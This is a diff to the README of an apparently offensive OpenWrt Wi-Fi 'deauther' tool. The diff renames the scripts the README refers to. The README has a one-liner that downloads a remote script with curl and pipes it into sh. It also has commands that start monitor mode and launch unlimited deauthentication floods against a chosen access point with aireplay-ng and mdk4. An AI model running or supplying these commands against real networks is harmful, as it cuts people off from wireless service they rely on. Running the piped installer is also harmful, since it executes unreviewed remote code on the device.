@@ -24,12 +24,12 @@ opkg update && wget -O mdk4.ipk https://raw.githubusercontent.com/xiv3r/openwrt-
 ## Auto install 
 ```sh
 
-opkg update && opkg install curl && curl https://raw.githubusercontent.com/xiv3r/openwrt-deauther/refs/heads/main/monitor_mode.sh | sh
+opkg update && opkg install curl && curl https://raw.githubusercontent.com/xiv3r/openwrt-deauther/refs/heads/main/install.sh | sh
 ````
 
 # Using aireplay-ng 
 ```sh
-sh monitor_mode.sh && airodump-ng mon0
+sh mon.sh && airodump-ng mon0
 ```
 > ctrl + c
 ```sh
@@ -38,7 +38,7 @@ aireplay-ng --deauth 0 -a (Mac BSSID)
 
 # Using mdk4
 ```sh
-sh monitor_mode.sh && mdk4 mon0 d
+sh mon.sh && mdk4 mon0 d
 ```
 ## Manual
 > More info
